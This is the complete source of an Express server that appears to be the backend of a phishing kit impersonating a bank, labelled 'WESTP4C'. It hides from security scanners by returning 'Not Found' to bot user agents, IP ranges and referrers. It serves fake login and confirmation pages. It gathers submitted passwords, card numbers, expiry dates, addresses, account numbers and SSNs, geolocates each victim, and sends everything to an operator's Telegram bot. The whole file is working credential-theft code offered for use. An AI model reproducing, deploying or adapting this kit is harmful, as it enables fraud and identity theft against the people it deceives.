const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs').promises;
const { getClientIp } = require("request-ip");
const axios = require('axios');
const { sendMessageFor } = require('simple-telegram-message');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');

const {
  botToken,
  chatId,
  ApiKey,
  botUAList,
  botIPList,
  botIPRangeList,
  botIPCIDRRangeList,
  botIPWildcardRangeList,
  botRefList
} = require('./config/settings.js');

const app = express();
const port = 3000;

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));


// Middleware function for bot detection
app.use((req, res, next) => {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  try {
    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
      return res.status(404).send('Not Found');
    } else {
      next();
    }
  } catch (error) {
    console.error('Error in bot detection middleware:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/Authenticate', async (req, res) => {
  try {
    const htmlContent = await fs.readFile(path.join(__dirname, 'views', 'index.html'), 'utf-8');	
  	res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file for /index.html', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/Confirm', async (req, res) => {
  try {
    const htmlContent = await fs.readFile(path.join(__dirname, 'views', 'confirm.html'), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file for /confirm.html', error);
    res.status(500).send('Internal Server Error');
  }
});



// Function to send API request
async function sendAPIRequest(ipAddress) {
  const apiResponse = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${ApiKey}`);
  return apiResponse.data;
}

// Helper function to check if user agent is a bot
function isBotUA(userAgent) {
  // Log the user-agent header
  console.log('User-Agent:', userAgent);

  if (!userAgent) {
    userAgent = '';
  }

  if (isbot(userAgent)) {
    return true;
  }

  for (let i = 0; i < botUAList.length; i++) {
    if (userAgent.toLowerCase().includes(botUAList[i])) {
      return true;
    }
  }

  return false;
}

// Helper function to check if IP address is a bot
function isBotIP(ipAddress) {
  if (!ipAddress) {
    ipAddress = '';
  }

  if (ipAddress.substr(0, 7) == '::ffff:') {
    ipAddress = ipAddress.substr(7);
  }

  for (let i = 0; i < botIPList.length; i++) {
    if (ipAddress.includes(botIPList[i])) {
      return true;
    }
  }

  function IPtoNum(ip) {
    return Number(
      ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
    );
  }

  const inRange = botIPRangeList.some(
    ([min, max]) =>
      IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
  );

  if (inRange) {
    return true;
  }

  for (let i = 0; i < botIPCIDRRangeList.length; i++) {
    if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
      return true;
    }
  }

  for (let i = 0; i < botIPWildcardRangeList.length; i++) {
    if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
      return true;
    }
  }

  return false;
}

// Helper function to check if referrer is a bot
function isBotRef(referer) {
  if (!referer) {
    referer = '';
  }

  for (let i = 0; i < botRefList.length; i++) {
    if (referer.toLowerCase().includes(botRefList[i])) {
      return true;
    }
  }
  return false;
}


// Middleware function for form submission
app.post('/receive', async (req, res) => {
  let message = '';
  let myObject = req.body;

  const ipAddress = getClientIp(req);
  const ipAddressInformation = await sendAPIRequest(ipAddress);
  const userAgent = req.headers["user-agent"];
  const systemLang = req.headers["accept-language"];

  const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
  console.log(myObjects);

  if (myObjects.includes('password')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 LOGIN \n\n`;

    for (const key of myObjects) {
      if (key !== 'visitor') {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }
    }
    
    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
      `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
      `CITY             : ${ipAddressInformation.location.city}\n` +
      `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
      `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
      `COUNTRY          : ${ipAddressInformation.country.name}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
      `💻 SYSTEM INFO\n` +
      `USER AGENT       : ${userAgent}\n` +
      `SYSTEM LANGUAGE  : ${systemLang}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;
  }

  if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('Billing Address')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 CARD INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }
  
  if (myObjects.includes('email')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 EMAIL INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }

  if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 ADDRESS INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }
  
  if (myObjects.includes('memberNumber') || myObjects.includes('accountNumber') || myObjects.includes('ssn')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 USER ACCOUNT INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }

  console.log(message); 
  const sendMessage = sendMessageFor(botToken, chatId); 
  sendMessage(message);
});

// Function to send API request
async function sendAPIRequest(ipAddress) {
  const apiResponse = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${ApiKey}`);
  return apiResponse.data;
}

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});